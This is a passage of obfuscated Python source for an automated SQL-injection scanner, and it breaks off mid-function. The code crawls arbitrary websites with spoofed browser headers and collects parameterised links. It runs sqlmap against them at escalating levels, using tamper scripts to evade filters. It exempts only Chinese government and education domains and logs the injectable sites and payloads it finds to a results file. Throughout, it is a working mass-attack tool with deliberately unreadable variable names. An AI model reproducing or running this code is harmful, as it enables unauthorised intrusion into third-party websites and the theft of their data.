# coding:utf-8
import subprocess  # line:2
import os  # line:3
import random  # line:4
import re  # line:5
import requests  # line:6
import time  # line:7
import multiprocessing  # line:8
from bs4 import BeautifulSoup  # line:9
import sys  # line:10

requests.packages.urllib3.disable_warnings()  # line:11
os_python = os.path.join(os.getcwd(), 'lib\python.exe')  # line:13
os_sqlmap = os.path.join(os.getcwd(), 'lib\sqlmap\\')  # line:14
os_run = os_python + ' ' + os_sqlmap  # line:15


def writedata(O00O00OO00O00OO0O):  # line:18
    with open('log.txt', 'a+')as OOO0O0OO00000OO0O:  # line:19
        OOO0O0OO00000OO0O.write('-------------------------------------' + '\n')  # line:20
        OOO0O0OO00000OO0O.write(
            str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + O00O00OO00O00OO0O + '\n')  # line:21


REFERERS = ["https://www.baidu.com", "http://www.baidu.com", "https://www.google.com.hk", "http://www.so.com",
            "http://www.sogou.com", "http://www.soso.com", "http://www.bing.com", ]  # line:32
headerss = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
            "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]  # line:52
headers = {'User-Agent': random.choice(headerss),
           'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'Cache-Control': 'max-age=0', 'referer': random.choice(REFERERS),
           'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3', }  # line:60


def get_links(OO0OOO0OO0OO000O0):  # line:63
    ""  # line:73
    time.sleep(random.randint(1, 6))  # line:74
    if 'gov.cn' in OO0OOO0OO0OO000O0 or 'edu.cn' in OO0OOO0OO0OO000O0:  # line:75
        return 0  # line:76
    O0O0O000OO0O0OOOO = OO0OOO0OO0OO000O0.split('//')[1].strip('/').replace('www.', '')  # line:77
    O0OOO0000OOO0OOO0 = []  # line:78
    O0OOO0O0OO0000O00 = []  # line:79
    OO0OOOO00OO00O0O0 = []  # line:80
    O0O0O0O0000O0OOOO = {}  # line:81
    OO00O0O0O0000OO00 = []  # line:82
    O0O0O0O0000O0OOOO['title'] = '网址标题获取失败'  # line:83
    OOOO0OOO0OO0OOO0O = []  # line:84
    OOOO00OO000O0O00O = []  # line:85
    try:  # line:86
        OOO0O0OO0O0OO00OO = {'User-Agent': random.choice(headerss),
                             'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                             'Cache-Control': 'max-age=0', 'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3', }  # line:92
        O00OOOO00O0O000OO = requests.get(OO0OOO0OO0OO000O0, headers=OOO0O0OO0O0OO00OO, verify=False,
                                         timeout=10).content  # line:93
        OO0OOOO0OOO000O0O = BeautifulSoup(O00OOOO00O0O000OO, 'html.parser', from_encoding='iso-8859-1')  # line:94
        try:  # line:95
            O0O0O0O0000O0OOOO['title'] = OO0OOOO0OOO000O0O.title.text  # line:96
        except Exception as O0000OO0OO00OOO0O:  # line:97
            writedata('[WARNING ERROR]' + str(O0000OO0OO00OOO0O))  # line:98
            try:  # line:99
                O0O0O0O0000O0OOOO['title'] = re.search(b'<title>(.*?)</title>', O00OOOO00O0O000OO, re.I | re.S).group(
                    1)  # line:100
            except Exception as O0000OO0OO00OOO0O:  # line:101
                writedata('[WARNING ERROR]' + str(O0000OO0OO00OOO0O))  # line:102
                pass  # line:103
        if O0O0O0O0000O0OOOO['title'] == '' or O0O0O0O0000O0OOOO['title'] == None:  # line:104
            O0O0O0O0000O0OOOO['title'] = '网址标题获取失败'  # line:105
        OO0OOO0OOO000O000 = OO0OOOO0OOO000O0O.findAll('a')  # line:106
        for O00O000OO00OO00OO in OO0OOO0OOO000O000:  # line:107
            _OOO0O000OO0O0000O = O00O000OO00OO00OO.get('href')  # line:108
            O0OO0OO00OOO000O0 = re.search('(javascript|:;|#)', str(_OOO0O000OO0O0000O))  # line:109
            O0O000O0OOO0O0OO0 = re.search('.(jpg|png|bmp|mp3|wma|wmv|gz|zip|rar|iso|pdf|txt)',
                                          str(_OOO0O000OO0O0000O))  # line:110
            if O0OO0OO00OOO000O0 == None and O0O000O0OOO0O0OO0 == None:  # line:111
                O0OOO0000OOO0OOO0.append(str(_OOO0O000OO0O0000O))  # line:112
            else:  # line:113
                pass  # line:114
        if O0OOO0000OOO0OOO0 != []:  # line:115
            O0OO000O00O000OOO = list(set(O0OOO0000OOO0OOO0))  # line:116
            for OO0OO0000OO0O0O00 in O0OO000O00O000OOO:  # line:117
                if '//' in OO0OO0000OO0O0O00 and 'http' in OO0OO0000OO0O0O00:  # line:118
                    if O0O0O000OO0O0OOOO in OO0OO0000OO0O0O00:  # line:121
                        if '?' in OO0OO0000OO0O0O00 and '=' in OO0OO0000OO0O0O00:  # line:122
                            O0OOO0O0OO0000O00.append(OO0OO0000OO0O0O00.strip())  # line:124
                        if '.html' in OO0OO0000OO0O0O00 or '.shtml' in OO0OO0000OO0O0O00 or '.htm' in OO0OO0000OO0O0O00 or '.shtm' in OO0OO0000OO0O0O00:  # line:125
                            if '?' not in OO0OO0000OO0O0O00:  # line:126
                                OO0OOOO00OO00O0O0.append(OO0OO0000OO0O0O00.strip())  # line:128
                elif 'http' not in OO0OO0000OO0O0O00 and O0O0O000OO0O0OOOO in OO0OO0000OO0O0O00:  # line:130
                    if '?' in OO0OO0000OO0O0O00 and '=' in OO0OO0000OO0O0O00:  # line:131
                        O0OOO0O0OO0000O00.append('http://' + OO0OO0000OO0O0O00.lstrip('/').strip())  # line:132
                    if '.html' in OO0OO0000OO0O0O00 or '.shtml' in OO0OO0000OO0O0O00 or '.htm' in OO0OO0000OO0O0O00 or '.shtm' in OO0OO0000OO0O0O00:  # line:133
                        if '?' not in OO0OO0000OO0O0O00:  # line:134
                            OO0OOOO00OO00O0O0.append('http://' + OO0OO0000OO0O0O00.lstrip('/').strip())  # line:135
                else:  # line:137
                    if '?' in OO0OO0000OO0O0O00 and '=' in OO0OO0000OO0O0O00:  # line:139
                        O0OOO0O0OO0000O00.append(OO0OOO0OO0OO000O0 + '/' + OO0OO0000OO0O0O00.strip())  # line:141
                    if '.html' in OO0OO0000OO0O0O00 or '.shtml' in OO0OO0000OO0O0O00 or '.htm' in OO0OO0000OO0O0O00 or '.shtm' in OO0OO0000OO0O0O00:  # line:142
                        if '?' not in OO0OO0000OO0O0O00:  # line:144
                            OO0OOOO00OO00O0O0.append(OO0OOO0OO0OO000O0 + '/' + OO0OO0000OO0O0O00.strip())  # line:145
            for OOOO0OO0O0OO0OOOO in OO0OOOO00OO00O0O0:  # line:147
                try:  # line:148
                    O00OOO0OO00OOOO00 = requests.head(url=OOOO0OO0O0OO0OOOO, headers=OOO0O0OO0O0OO00OO, verify=False,
                                                      timeout=15).status_code  # line:149
                    if O00OOO0OO00OOOO00 == 200:  # line:150
                        OOOO00OO000O0O00O.append(OOOO0OO0O0OO0OOOO)  # line:151
                except Exception as O0000OO0OO00OOO0O:  # line:152
                    writedata('[WARNING ERROR]' + str(O0000OO0OO00OOO0O))  # line:153
                    pass  # line:154
            for O0O0OO000O0OO0OO0 in O0OOO0O0OO0000O00:  # line:155
                try:  # line:156
                    OO0O0OO00O000OOO0 = requests.head(url=O0O0OO000O0OO0OO0, headers=OOO0O0OO0O0OO00OO, verify=False,
                                                      timeout=15).status_code  # line:157
                    if OO0O0OO00O000OOO0 == 200:  # line:158
                        OOOO0OOO0OO0OOO0O.append(O0O0OO000O0OO0OO0)  # line:159
                except Exception as O0000OO0OO00OOO0O:  # line:160
                    writedata('[WARNING ERROR]' + str(O0000OO0OO00OOO0O))  # line:161
                    pass  # line:162
            if OOOO00OO000O0O00O == []:  # line:164
                pass  # line:165
            else:  # line:166
                for OOO00OO00000O00O0 in OOOO00OO000O0O00O:  # line:167
                    if OOO00OO00000O00O0.count('/') > 3:  # line:168
                        O0O0000O00OO0O00O = re.search('.*?/[0-9]\.', str(OOO00OO00000O00O0))  # line:169
                        if O0O0000O00OO0O00O == None:  # line:170
                            pass  # line:171
                        else:  # line:172
                            OO00O0O0O0000OO00.append(OOO00OO00000O00O0)  # line:173
                        if OO00O0O0O0000OO00 == []:  # line:174
                            OO00O0O0O0000OO00.append(random.choice(OOOO00OO000O0O00O))  # line:175
                if OO00O0O0O0000OO00 == []:  # line:177
                    O0O0O0O0000O0OOOO['html_links'] = random.choice(OOOO00OO000O0O00O)  # line:178
                else:  # line:179
                    O0O0O0O0000O0OOOO['html_links'] = random.choice(OO00O0O0O0000OO00)  # line:180
            if OOOO0OOO0OO0OOO0O == []:  # line:182
                pass  # line:183
            else:  # line:184
                O0O0O0O0000O0OOOO['id_links'] = random.choice(OOOO0OOO0OO0OOO0O)  # line:185
        if O0O0O0O0000O0OOOO == {}:  # line:186
            return None  # line:187
        else:  # line:188
            return O0O0O0O0000O0OOOO  # line:189
    except Exception as O0000OO0OO00OOO0O:  # line:191
        writedata('[WARNING ERROR]' + str(O0000OO0OO00OOO0O))  # line:192
        pass  # line:193
    return None  # line:194


def check(O00O0000OO0O0OOOO, OO0O00OOOOOO00O00, OO0O00O000O00OO00, title='获取标题失败'):  # line:197
    O00O0000OO0O0OOOO = O00O0000OO0O0OOOO  # line:198
    title = title  # line:199
    OO0O00OOOOOO00O00 = OO0O00OOOOOO00O00.replace('^', '')  # line:200
    if '---' in O00O0000OO0O0OOOO:  # line:201
        if 'sqlmap was not able to fingerprint the back-end database management syste' not in O00O0000OO0O0OOOO:  # line:202
            try:  # line:203
                O0OOOO000O0OO00OO = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', O00O0000OO0O0OOOO,
                                              re.S)  # line:204
                OOO00O000O00O0000 = O0OOOO000O0OO00OO.group(1)  # line:205
                OO00OO0O00000O000 = O0OOOO000O0OO00OO.group(2)  # line:206
                with open('result.txt', 'a+', encoding='utf-8')as O0000000O0OOO00O0:  # line:207
                    O0000000O0OOO00O0.write('-------------------------------------------------')  # line:208
                    O0000000O0OOO00O0.write(
                        '发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')  # line:209
                    O0000000O0OOO00O0.write('网站标题 : ' + title + '\n')  # line:210
                    O0000000O0OOO00O0.write('注入网址 : ' + OO0O00OOOOOO00O00 + '\n')  # line:211
                    O0000000O0OOO00O0.write('执行命令 : ' + OO0O00O000O00OO00 + '\n')  # line:212
                    O0000000O0OOO00O0.write(
                        OOO00O000O00O0000.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace(
                            'Title: ', '注入标题 : ').replace('Payload: ', '注入攻击 : ') + '\n')  # line:215
                    if 'back-end DBMS' in OO00OO0O00000O000:  # line:216
                        O0000000O0OOO00O0.write(OO00OO0O00000O000.replace('the back-end DBMS is ', '数据库类型 : ').replace(
                            'web server operating system: ', '服务器版本 : ').replace('web application technology: ',
                                                                                 '服务器语言 : ').replace('back-end DBMS: ',
                                                                                                     '数据库版本 : ') + '\n')  # line:221
                    else:  # line:222
                        O0000000O0OOO00O0.write('\n' + '可能存在注入但被拦截,或者无法识别数据库版本' + '\n')  # line:223
                    return 'INJ'  # line:225
            except Exception as OOOOOOO00O0OO0O0O:  # line:226
                writedata('[WARNING ERROR]' + str(OOOOOOO00O0OO0O0O))  # line:227
        else:  # line:228
            try:  # line:229
                O0OOOO000O0OO00OO = re.search('---(.*?)---.*?INFO\] (.*?)\[', O00O0000OO0O0OOOO, re.S)  # line:230
                OOO00O000O00O0000 = O0OOOO000O0OO00OO.group(1)  # line:231
                with open('result.txt', 'a+')as O0000000O0OOO00O0:  # line:232
                    O0000000O0OOO00O0.write('-------------------------------------------------')  # line:233
                    O0000000O0OOO00O0.write(
                        '发现时间 : ' + str(time.strftime('%Y-%m-%d:%H:%M:%S', time.localtime())) + '\n')  # line:234
                    O0000000O0OOO00O0.write('网站标题 : ' + title + '\n')  # line:235
                    O0000000O0OOO00O0.write('注入网址 : ' + OO0O00OOOOOO00O00 + '\n')  # line:236
                    O0000000O0OOO00O0.write('执行命令 : ' + OO0O00O000O00OO00 + '\n')  # line:237
                    O0000000O0OOO00O0.write(
                        OOO00O000O00O0000.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace(
                            'Title: ', '注入标题 : ').replace('Payload: ', '注入攻击 : ') + '\n')  # line:240
                    O0000000O0OOO00O0.write('\n' + '存在注入但无法识别数据库版本' + '\n')  # line:241
                    return 'INJ'  # line:242
            except Exception as OOOOOOO00O0OO0O0O:  # line:243
                writedata('[WARNING ERROR]' + str(OOOOOOO00O0OO0O0O))  # line:244


def scan_level_0(O0O00O0O0OO000000, O00O00O0O0OOO0O0O):  # line:247
    O0O00O0O0OO000000 = O0O00O0O0OO000000.replace('&', '^&')  # line:248
    O0O0OOOOO00OO0OO0 = os_run + 'sqlmap.py -u %s --technique B --batch --thread=10 --random-agent' % O0O00O0O0OO000000  # line:249
    print('Level 0 : ' + O0O00O0O0OO000000.replace('^', '').replace('*', ''))  # line:250
    writedata(O0O0OOOOO00OO0OO0)  # line:251
    try:  # line:252
        O0O0O000O0O0OOO00 = subprocess.Popen(O0O0OOOOO00OO0OO0, shell=True, stdout=subprocess.PIPE)  # line:253
        O0OO0OOOOOO0O00OO = O0O0O000O0O0OOO00.stdout.read().decode()  # line:254
        writedata(O0OO0OOOOOO0O00OO)  # line:255
        O0O0OO0O0O0OO00O0 = check(O0OO0OOOOOO0O00OO, url=O0O00O0O0OO000000, common=O0O0OOOOO00OO0OO0,
                                  title=O00O00O0O0OOO0O0O)  # line:256
    except Exception as OOO00O0O0O0OO0O00:  # line:257
        writedata('[WARNING ERROR]' + str(OOO00O0O0O0OO0O00))  # line:258
        pass  # line:259
    finally:  # line:260
        O0O0O000O0O0OOO00.terminate()  # line:261
        return O0O0OO0O0O0OO00O0  # line:262


def scan_level_1(O0OOO0OO0O000O00O, OO0OOO0O00OO0OOO0):  # line:264
    O0OOO0OO0O000O00O = O0OOO0OO0O000O00O.replace('&', '^&')  # line:265
    OO00O00O0O0000O0O = os_run + 'sqlmap.py -u %s --batch --thread=10 --random-agent' % O0OOO0OO0O000O00O  # line:266
    print('Level 1 : ' + O0OOO0OO0O000O00O.replace('^', '').replace('*', ''))  # line:267
    writedata(OO00O00O0O0000O0O)  # line:268
    try:  # line:269
        O0O0OO00O0O00O00O = subprocess.Popen(OO00O00O0O0000O0O, shell=True, stdout=subprocess.PIPE)  # line:270
        O0O0O0O0000O0000O = O0O0OO00O0O00O00O.stdout.read().decode()  # line:271
        writedata(O0O0O0O0000O0000O)  # line:272
        OO0O00OOOO0O00OO0 = check(O0O0O0O0000O0000O, url=O0OOO0OO0O000O00O, common=OO00O00O0O0000O0O,
                                  title=OO0OOO0O00OO0OOO0)  # line:273
    except Exception as OO0O00OO00O000OO0:  # line:274
        writedata('[WARNING ERROR]' + str(OO0O00OO00O000OO0))  # line:275
        pass  # line:276
    finally:  # line:277
        O0O0OO00O0O00O00O.terminate()  # line:278
        return OO0O00OOOO0O00OO0  # line:279


def scan_level_2(O0OO0000OOOO0OOOO, OOOOO0O000OO00O0O):  # line:282
    O00OOO0OOOO0OOOOO, OO0000O00OOOO000O = O0OO0000OOOO0OOOO.split('?')[0], O0OO0000OOOO0OOOO.split('?')[1]  # line:283
    O00OOO0OOOO0OOOOO = O00OOO0OOOO0OOOOO.replace('&', '^&')  # line:284
    OO0000O00OOOO000O = OO0000O00OOOO000O.replace('&', '^&')  # line:285
    OOO0O0O00O0OO0OOO = os_run + "sqlmap.py -u {} --cookie {} --level 2 --batch --thread=10 --random-agent".format(
        O00OOO0OOOO0OOOOO, OO0000O00OOOO000O)  # line:287
    print('Level 2 : ' + O0OO0000OOOO0OOOO.replace('^', '').replace('*', ''))  # line:288
    O00O0O0OO0OO0O000 = os_run + "sqlmap.py -u {} --data {} --level 2 --batch --thread=10 --random-agent".format(
        O00OOO0OOOO0OOOOO, OO0000O00OOOO000O)  # line:289
    writedata(O00O0O0OO0OO0O000)  # line:290
    writedata(OOO0O0O00O0OO0OOO)  # line:291
    try:  # line:293
        OO0OO000OO0OOOOOO = subprocess.Popen(OOO0O0O00O0OO0OOO, shell=True, stdout=subprocess.PIPE)  # line:294
        O00O00OOOO0O0OOO0 = OO0OO000OO0OOOOOO.stdout.read().decode()  # line:295
        writedata(O00O00OOOO0O0OOO0)  # line:296
        O00O00000OO00O0OO = check(O00O00OOOO0O0OOO0, url=O0OO0000OOOO0OOOO, common=OOO0O0O00O0OO0OOO,
                                  title=OOOOO0O000OO00O0O)  # line:297
    except Exception as OO0OO0OOO00OO0000:  # line:298
        writedata('[WARNING ERROR]' + str(OO0OO0OOO00OO0000))  # line:299
        pass  # line:300
    finally:  # line:301
        OO0OO000OO0OOOOOO.terminate()  # line:302
        if O00O00000OO00O0OO == 'INJ':  # line:303
            return O00O00000OO00O0OO  # line:304
    try:  # line:306
        OO0OO000OO0OOOOOO = subprocess.Popen(O00O0O0OO0OO0O000, shell=True, stdout=subprocess.PIPE)  # line:307
        O00O00OOOO0O0OOO0 = OO0OO000OO0OOOOOO.stdout.read().decode()  # line:308
        writedata(O00O00OOOO0O0OOO0)  # line:309
        O00O00000OO00O0OO = check(O00O00OOOO0O0OOO0, url=O0OO0000OOOO0OOOO, common=O00O0O0OO0OO0O000,
                                  title=OOOOO0O000OO00O0O)  # line:310
    except Exception as OO0OO0OOO00OO0000:  # line:311
        writedata('[WARNING ERROR]' + str(OO0OO0OOO00OO0000))  # line:312
        pass  # line:313
    finally:  # line:314
        OO0OO000OO0OOOOOO.terminate()  # line:315
        return O00O00000OO00O0OO  # line:316


def scan_level_3(O00000OOO0OO000O0, OO00O00O0OO0O0OO0):  # line:319
    O00000OOO0OO000O0 = O00000OOO0OO000O0.replace('&', '^&')  # line:320
    OOO0O0OOOOO0O0O0O = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % O00000OOO0OO000O0  # line:321
    print('Level 3 : ' + O00000OOO0OO000O0.replace('^', '').replace('*', ''))  # line:322
    writedata(OOO0O0OOOOO0O0O0O)  # line:323
    try:  # line:324
        OOOOO0000OOO0O000 = subprocess.Popen(OOO0O0OOOOO0O0O0O, shell=True, stdout=subprocess.PIPE)  # line:325
        O0O00000000OOO00O = OOOOO0000OOO0O000.stdout.read().decode()  # line:326
        writedata(O0O00000000OOO00O)  # line:327
        OOO00000OOOO0OO0O = check(O0O00000000OOO00O, url=O00000OOO0OO000O0, common=OOO0O0OOOOO0O0O0O,
                                  title=OO00O00O0OO0O0OO0)  # line:329
    except Exception as O0OO0000OOO000OO0:  # line:330
        writedata('[WARNING ERROR]' + str(O0OO0000OOO000OO0))  # line:331
        pass  # line:332
    finally:  # line:333
        OOOOO0000OOO0O000.terminate()  # line:334
        return OOO00000OOOO0OO0O  # line:335


def scan_level_4(O0OOOOO0O0O00OOOO, OOOOOO0O00O000O00):  # line:338
    O000OO000OO0OO00O, OOOOOOOOO0OO0000O = O0OOOOO0O0O00OOOO.split('?')[0], O0OOOOO0O0O00OOOO.split('?')[1]  # line:339
    O000OO000OO0OO00O = O000OO000OO0OO00O.replace('&', '^&')  # line:340
    OOOOOOOOO0OO0000O = OOOOOOOOO0OO0000O.replace('&', '^&')  # line:341
    OOO00OO00O0OOOO0O = os_run + "sqlmap.py -u {} --cookie {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        O000OO000OO0OO00O, OOOOOOOOO0OO0000O)  # line:343
    print('Level 4 : ' + O0OOOOO0O0O00OOOO.replace('^', '').replace('*', ''))  # line:344
    O00O000OO0OO00000 = os_run + "sqlmap.py -u {} --data {} --level 2 --tamper space2comment.py --batch --thread=10 --random-agent".format(
        O000OO000OO0OO00O, OOOOOOOOO0OO0000O)  # line:346
    writedata(OOO00OO00O0OOOO0O)  # line:347
    writedata(O00O000OO0OO00000)  # line:348
    try:  # line:350
        OOOO0OOO000O0OOOO = subprocess.Popen(OOO00OO00O0OOOO0O, shell=True, stdout=subprocess.PIPE)  # line:351
        O0O00O0OO00O0O00O = OOOO0OOO000O0OOOO.stdout.read().decode()  # line:352
        writedata(O0O00O0OO00O0O00O)  # line:353
        OO0O0OOO00OOOO00O = check(O0O00O0OO00O0O00O, url=O0OOOOO0O0O00OOOO, common=OOO00OO00O0OOOO0O,
                                  title=OOOOOO0O00O000O00)  # line:355
    except Exception as O00O0000O00OO0OOO:  # line:356
        writedata('[WARNING ERROR]' + str(O00O0000O00OO0OOO))  # line:357
        pass  # line:358
    finally:  # line:359
        OOOO0OOO000O0OOOO.terminate()  # line:360
        if OO0O0OOO00OOOO00O == 'INJ':  # line:361
            return OO0O0OOO00OOOO00O  # line:362
    try:  # line:364
        OOOO0OOO000O0OOOO = subprocess.Popen(O00O000OO0OO00000, shell=True, stdout=subprocess.PIPE)  # line:365
        O0O00O0OO00O0O00O = OOOO0OOO000O0OOOO.stdout.read().decode()  # line:366
        writedata(O0O00O0OO00O0O00O)  # line:367
        OO0O0OOO00OOOO00O = check(O0O00O0OO00O0O00O, url=O0OOOOO0O0O00OOOO, common=O00O000OO0OO00000,
                                  title=OOOOOO0O00O000O00)  # line:368
    except Exception as O00O0000O00OO0OOO:  # line:369
        writedata('[WARNING ERROR]' + str(O00O0000O00OO0OOO))  # line:370
        pass  # line:371
    finally:  # line:372
        OOOO0OOO000O0OOOO.terminate()  # line:373
        return OO0O0OOO00OOOO00O  # line:374


def scan_level_5(O00OO0O000000O00O, O0O000000OO0O00O0):  # line:377
    O00OO0O000000O00O = O00OO0O000000O00O.replace('&', '^&')  # line:379
    O0OO0OOO0OO00O00O = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
        O00OO0O000000O00O)  # line:381
    print('Level 5 : ' + O00OO0O000000O00O.replace('^', '').replace('*', ''))  # line:382
    writedata(O0OO0OOO0OO00O00O)  # line:383
    try:  # line:385
        O00OOO0OO0000OO0O = subprocess.Popen(O0OO0OOO0OO00O00O, shell=True, stdout=subprocess.PIPE)  # line:386
        O000O0OOO000OO000 = O00OOO0OO0000OO0O.stdout.read().decode()  # line:387
        writedata(O000O0OOO000OO000)  # line:388
        O0O0OOOOO0O0OOOOO = check(O000O0OOO000OO000, url=O00OO0O000000O00O, common=O0OO0OOO0OO00O00O,
                                  title=O0O000000OO0O00O0)  # line:390
    except Exception as O0OOOO00O0O0OOO00:  # line:391
        writedata('[WARNING ERROR]' + str(O0OOOO00O0O0OOO00))  # line:392
        pass  # line:393
    finally:  # line:394
        O00OOO0OO0000OO0O.terminate()  # line:395
        return O0O0OOOOO0O0OOOOO  # line:396


def scan_html(O0O000OOO00O00O00, OOOOOOO0OOOOOO000, OOO0000OOO00OOO00):  # line:399
    O0O000O0O00OOOOO0 = O0O000OOO00O00O00.replace('.htm', '*.htm').replace('.shtm', '*.shtm')  # line:400
    O0OOOOOO0OO0O0O0O = O0O000O0O00OOOOO0.replace('&', '^&')  # line:401
    if OOO0000OOO00OOO00 == 1 or OOO0000OOO00OOO00 == 2 or OOO0000OOO00OOO00 == 0:  # line:402
        O00OO0OO000000O00 = os_run + 'sqlmap.py -u {} --batch --thread=10 --random-agent'.format(
            O0OOOOOO0OO0O0O0O)  # line:403
        if OOO0000OOO00OOO00 == 1:  # line:404
            print('Level 1 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:405
        if OOO0000OOO00OOO00 == 2:  # line:406
            print('Level 2 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:407
        if OOO0000OOO00OOO00 == 0:  # line:408
            print('Level 0 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:409
    if OOO0000OOO00OOO00 == 3 or OOO0000OOO00OOO00 == 4:  # line:411
        O00OO0OO000000O00 = os_run + 'sqlmap.py -u %s --batch --tamper space2comment.py --thread=10 --random-agent' % O0OOOOOO0OO0O0O0O  # line:412
        if OOO0000OOO00OOO00 == 3:  # line:413
            print('Level 3 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:414
        else:  # line:415
            print('Level 4 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:416
    if OOO0000OOO00OOO00 == 5:  # line:417
        O00OO0OO000000O00 = os_run + 'sqlmap.py -u {} --batch --tamper space2comment.py --delay 2 --time-sec=15 --timeout=20  --level 5 --thread=10 --random-agent'.format(
            O0OOOOOO0OO0O0O0O)  # line:419
        print('Level 5 : ' + O0OOOOOO0OO0O0O0O.replace('^', '').replace('*', ''))  # line:420
    writedata(O00OO0OO000000O00)  # line:421
    try:  # line:423
        O0O0O0O0OOO00O00O = subprocess.Popen(O00OO0OO000000O00, shell=True, stdout=subprocess.PIPE)  # line:424
        O00OO0OOO0O0OO0O0 = O0O0O0O0OOO00O00O.stdout.read().decode()  # line:425
        writedata(O00OO0OOO0O0OO0O0)  # line:426
        check(O00OO0OOO0O0OO0O0, url=O0O000OOO00O00O00, common=O00OO0OO000000O00, title=OOOOOOO0OOOOOO000)  # line:428
    except Exception as O00OOO0000OO0OOOO:  # line:429
        writedata('[WARNING ERROR]' + str(O00OOO0000OO0OOOO))  # line:430
        pass  # line:431
    finally:  # line:432
        O0O0O0O0OOO00O00O.terminate()  # line:433


def get_url_sql(OOO00000O0O0OOOOO, level=1):  # line:436
    OO0OO000OO000O00O = get_links(OOO00000O0O0OOOOO)  # line:437
    if OO0OO000OO000O00O == None:  # line:438
        pass  # line:439
    else:  # line:440
        if 'html_links' in OO0OO000OO000O00O.keys():  # line:441
            scan_html(OO0OO000OO000O00O['html_links'].replace(' ', ''), OO0OO000OO000O00O['title'], level)  # line:442
        if 'id_links' in OO0OO000OO000O00O.keys():  # line:443
            if level == 0:  # line:444
                scan_level_0(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:445
            if level == 1:  # line:446
                scan_level_1(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:447
            if level == 2:  # line:448
                scan_level_2(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:449
            if level == 3:  # line:450
                scan_level_3(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:451
            if level == 4:  # line:452
                scan_level_4(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:453
            if level == 5:  # line:454
                scan_level_5(OO0OO000OO000O00O['id_links'].replace(' ', ''), OO0OO000OO000O00O['title'])  # line:455
            if level == 6:  # line:456
                O0OOO0OOOO0O000O0 = scan_level_0(OO0OO000OO000O00O['id_links'].replace(' ', ''),
                                                 OO0OO000OO000O00O['title'])  # line:457
                if O0OOO0OOOO0O000O0 != None:  # line:458
                    return O0OOO0OOOO0O000O0  # line:459
                O00OOOO000O0OO000 = scan_level_1(OO0OO000OO000O00O['id_links'].replace(' ', ''),
                                                 OO0OO000OO000O00O['title'])  # line:461
                if O00OOOO000O0OO000 != None:  # line:462
                    return O00OOOO000O0OO000  # line:463
                OO00OOOO0O0OO0O0O = scan_level_2(OO0OO000OO000O00O['id_links'].replace(' ', ''),
